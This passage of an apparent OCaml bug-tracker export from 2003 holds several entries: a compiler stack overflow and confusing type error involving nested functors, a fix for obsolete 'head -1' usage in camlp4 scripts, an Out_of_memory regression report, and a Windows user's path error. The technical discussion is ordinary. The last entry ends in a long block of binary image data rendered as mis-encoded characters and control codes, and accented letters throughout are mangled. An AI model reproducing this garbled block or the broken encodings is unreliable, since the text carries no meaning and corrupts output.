impossible to come up with a \"minimal example\". I have a \r\nrule-based abstract processor (Ã  la CLIPS) written as functor whose \r\nparameter module defines types \"fact\" and \"fact_base\" as well the \r\noperations which can be performed on them. I also have an SQL library \r\nwhich gives provides a statically typechecked abstract syntax for SQL \r\nand facilities to connect to databases through a doubly generic \r\ninterface: the first parameter module provides a database connection \r\nlayer, the second parameter (we call it the Access module) provides the \r\ntype information to the ocaml typechecking system to achieve static \r\ntypechecking of SQL in ocaml. This same generic library has a query \r\nrewriting rule engine Ã  la PostgreSQL which defines a fact base module \r\nfor the rule-based processor. This rewrite-rule functor takes an Access \r\nparameter, which must match the Access parameter passed to the DB \r\nfunctor. The actual rewrite rules are also defined in a functor which \r\ntakes an Access module as a parameter.\r\n\r\nFinally, I have an embedded-sql syntax extension which provides the \r\nsyntactic sugar to make everything nice and easy in an ocaml source \r\nfile. This syntax extension transforms SQL queries in concrete syntax \r\ninto an ocaml module which instantiates the DB functor and the \r\nrewrite-rule engine with the same Access module. Since no module has an \r\nexplicit signature hiding the type representations, I would expect the \r\ncompiler to be able to figure things out correctly. Instead, I used to \r\nget error messages of the following kind.\r\n\r\n > File \"inserimento_enti.xcaml\", line 95, characters 56-65:\r\n > This expression has type\r\n >   Local_rules.Rewrite.Rules.rule_base =\r\n >     Local_rules.Rewrite.Rules.rule list\r\n >     Map.Make(Local_rules.Rewrite.Rules.Fact_class_order).t\r\n > but is here used with type\r\n >   RW.Rules.rule list RW.Rules.FCM.t =\r\n >     RW.Rules.rule list Map.Make(RW.Rules.Fact_class_order).t\r\n\r\n\r\nWhich points to the following line:\r\n\r\n > let cont f init res execute =\r\n >   RW.rewrite_continuation rule_base (cont f)\r\n\r\nIt is worth noting that the following module definitions imply that the \r\nerror message is actually wrong.\r\n > (* in Inserimento_enti *)\r\n > module Local_rules = Generic_rules (Anagrafiche_logical)\r\n > module RW = Local_rules.Rewrite\r\n\r\n\r\nIntuitively, I'd say the type checker is having some real trouble with \r\nthe complex module operations I use. But, then again, there might be a \r\nproblem in my code. So, I removed the RW definition and changed the \r\ntroublesome line to the one originally mentioned in this post:\r\n > let cont f init res execute =\r\n >   Local_rules.Rewrite.rewrite_continuation rule_base (cont f)\r\n\r\nNow, this really turns the typechecker nuts. It simply cannot state that \r\nthere is a type error for the inferred type is identical to the actual \r\ntype. Here comes the stack overflow problem.\r\n\r\nSo, dear caml riders and caml breeders, how do we get out of this \r\nimpasse? I'm willing to submit my entire source tree. (I'd release it \r\nGPLed if only I had time to write a minimum of documentation and got it \r\nto compile properly...).\r\n\r\nAlex\n"},{"labels":["bug"],"text":"**Original bug ID:** 1943\n**Reporter:** administrator\n**Status:** closed (set by @damiendoligez on 2007-12-12T15:20:30Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #8385 #8445\n\n## Bug description\n\nThanks for answering.\r\n\r\nI finally managed to fix my mail client. I haven't been able to get \r\nanything from the list yesterday..\r\n\r\nRichard Jones wrote:\r\n\r\n> On Mon, Nov 24, 2003 at 06:21:07PM +0100, Alex Baretta wrote:\r\n> \r\n>>I am experiencing stack overflows while compiling a source file with \r\n>>ocamlc. Why in world should ocamlc overflow? How can I diagnose the problem?\r\n> \r\n> \r\n> We had this when compiling some OLE code (auto-generated ML). The\r\n> workaround was to increase the stack size:\r\n\r\nI am also trying to compile an auto-generated file, but it is rather \r\nsmall (140 lines of code). The binary search is probably not the way to \r\ngo, but let me see what happens if I try to increase the stack size...\r\n\r\n> export OCAMLRUNPARAM=l=16M\r\n\r\nOK, done that...\r\nocamlc is presently running with 98% of the cpu and some 70 MB of memory \r\nfootprint. It's almost certainly looping somewhere, allocating it's head \r\noff...\r\n\r\nDamien Doligez wrote:\r\n > On Monday, November 24, 2003, at 06:21 PM, Alex Baretta wrote:\r\n >\r\n > If you are using the CVS version, you should try to update to the\r\n > latest one.  One version was committed last week with a stack\r\n > overflow problem.\r\n >\r\n > -- Damien\r\n\r\nI am using the Xavier-patch 2 to ocaml-3.07. I'm not ehntusiastic about \r\nusing CVS. Since my company uses ocaml as it's main language for \r\ndeveloping commercial applications, I'd prefer to have a stable stock \r\nversion. After all the turmoil around 3.07, a stable bugfix release is \r\noverdue now.\r\n\r\n***\r\n\r\nLet try to produce a backtrace for the list...\r\n\r\nOK, so the standard ocamlc is compiled without debugging info. Let me \r\ntweak the Makefile, so that I can build a copy of ocamlc with the -g option.\r\n\r\nDone that. Here's the command I'm using to run the debugger:\r\n[alex@flyingtuxman anagrafiche]$ ocamldebug \r\n/opt/ocaml/3.07+2g/bin/ocamlc -I \r\n/opt/ocaml/3.07/lib/ocaml/site-lib/postgres -I \r\n/opt/ocaml/3.07/lib/ocaml/site-lib/cgi -I \r\n/home/alex/cvs/sw2/ocamllib-addons  -I /home/alex/cvs/sw2/unixlib-addons \r\n  -I /home/alex/cvs/sw2/rules-engine  -I \r\n/home/alex/cvs/sw2/xcaml/xcaml-lib  -I /home/alex/cvs/sw2/dbinterface \r\n-I /home/alex/cvs/sw2/freerp/db/db_access  -I \r\n/home/alex/cvs/sw2/freerp/lib  -I \r\n/home/alex/cvs/sw2/freerp/business_rules  -I /home/alex/cvs/sw2/dbschema \r\n  -I /home/alex/cvs/sw2/freerp/db/xcaml_db_schema  -I \r\n/home/alex/cvs/sw2/xcaml/xcaml-lib -c inserimento_enti_sql.ml\r\n\tObjective Caml Debugger version 3.07+2\r\n\r\n(ocd) run\r\nLoading program... done.\r\nTime : 2766617\r\nProgram end.\r\nUncaught exception: Stack_overflow\r\n(ocd) prev\r\nTime : 2766616 - pc : 824648 - module Errors\r\nNo source file for Errors.\r\n(ocd) bt\r\n#0  Pc : 824648  Errors char 2807\r\n#1  Pc : 68568  Format char 35089\r\n#2  Pc : 830376  Main char 5649\r\n#3  Pc : 834284  Main char 5678\r\n\r\n************\r\n\r\nNow what?\r\n\r\nAlex\n"},{"labels":["bug"],"text":"**Original bug ID:** 1942\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\n> J'espÃ¨re m'adresser au bon alias de messagerie pour cela ;\n\nC'est plutot caml-bugs@inria.fr, mais pas de probleme.\n\n> une difficultÃ© de compilation que j'ai rencontrÃ©e lors de la\n> compilation\n> de la version cvs d'OCaml, due Ã  une syntaxe Ã  prÃ©sent \"obsolete\" pour la\n> commande head (depuis coreutils-5.0.91) pour certaines valeurs de\n> 'posix2_version ()'.\n> Les seules utilisations de la commande head semblent se trouver ici:\n\n> % grep head camlp4/tools/*\n> camlp4/tools/apply.sh:head -1 $FILE >/dev/null 2>&1 || exit 1\n> camlp4/tools/apply.sh:set - `head -1 $FILE`\n> camlp4/tools/camlp4_comm.sh:head -1 $FILE >/dev/null || exit 1\n> camlp4/tools/camlp4_comm.sh:set - `head -1 $FILE`\n> camlp4/tools/conv.sh:set - `head -1 $FILE`\n>\n> et dans 'config/gnu/config.guess'\n\nJ'ai change les \"head -1 $FILE ... || exit 1\" en \"test -s $FILE || exit 1\"\net les autres occurrences en \"awk 'NR == 1'\" (eventuellement integre dans\nl'appel a awk qui suit, notamment dans config.guess).\n\nMerci,\n\n-- Michel Mauny\n"},{"labels":["bug"],"text":"**Original bug ID:** 1941\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nI have just discovered that some program that used to work fine up to\n(including) OCaml 3.07+2 doesn't work with the most recent CVS-snapshot\n3.07+5 (2003-11-19). It suddenly raises the exception Out_of_memory for\nno apparent reason.\n\nThe backtrace yields the following:\n\n  Fatal error: exception Out_of_memory\n  Raised by primitive operation at file \"format.ml\", line 1000, character 4\n  Called from file \"format.ml\", line 1000, character 4\n  Called from file \"format.ml\", line 994, character 4\n  Called from file \"list.ml\", line 74, character 34\n  Called from file \"format.ml\", line 994, character 4\n  Called from file \"list.ml\", line 74, character 34\n  Called from file \"format.ml\", line 1000, character 4\n  Called from file \"format.ml\", line 1000, character 4\n  Called from file \"sym_reg_gen.ml\", line 11, character 35\n\nThe GC-status after the last full major cycle looks as follows (in case\nthis helps):\n\n  minor_words: 32768\n  promoted_words: 4094\n  major_words: 7149\n  minor_collections: 1\n  major_collections: 0\n  heap_words: 61440\n  heap_chunks: 1\n  top_heap_words: 61440\n  live_words: 7149\n  live_blocks: 1248\n  free_words: 54291\n  free_blocks: 1\n  largest_free: 54291\n  fragments: 0\n  compactions: 0\n\nIt would be a bit tedious to narrow down the size of the program,\nbut since there are not too many changes between the two CVS-states,\nI hope that this is sufficient to find the problem.\n\nBest regards,\nMarkus\n\n-- \nMarkus Mottl          http://www.oefai.at/~markus          markus@oefai.at\n"},{"labels":["bug"],"text":"**Original bug ID:** 1940\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n<html><style>p {margin: 0px}</style><body style='font-size:9pt; font-family:Verdana; font-family: Verdana' ><STYLE>p {margin: 0px}</STYLE><P>hello,</P><P>a few weeks ago i downloaded ocaml for university and it worked fine until yesterday. ive tried everything but everytime i want to open it now i just get \"incorrect path for ocaml.exe\". maybe you know what is wrong and how to help me.</P><P>thanks</P><P>eva moutschka</P><P>(cpu 2,4 GHz; RAM 512 MB; Windows XP)</P></body></html>\n______________________________________________________________________________<br>Horoskop, Comics, VIPs, Wetter, Sport und Lotto im WEB.DE Screensaver1.2<br>Kostenlos downloaden: <A HREF=\"http://screensaver.web.de/?mc=021110\"><B>http://screensaver.web.de/?mc=021110</B></A>\n----------------\nBMÃ¶Â³\u0003\u0000\u0000\u0000\u0000\u00006\u0000\u0000\u0000(\u0000\u0000\u0000)\u0001\u0000\u0000\u0010\u0001\u0000\u0000\u0001\u0000\u0018\u0000\u0000\u0000\u0000\u0000ÃÂ³\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿